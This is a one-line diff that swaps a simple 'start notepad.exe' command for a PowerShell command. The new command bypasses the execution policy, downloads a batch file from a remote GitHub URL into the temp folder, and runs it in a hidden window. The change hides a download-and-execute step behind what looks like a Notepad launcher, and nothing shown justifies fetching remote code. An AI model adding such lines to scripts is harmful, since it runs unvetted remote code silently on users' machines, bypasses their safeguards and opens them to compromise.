@@ -1,1 +1,1 @@
-start notepad.exe
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ene1337/Notepad-BATCH/refs/heads/main/start-notepad.bat' -OutFile '$env:TEMP\start-notepad.bat'; Start-Process -WindowStyle Hidden -FilePath '$env:TEMP\start-notepad.bat'"
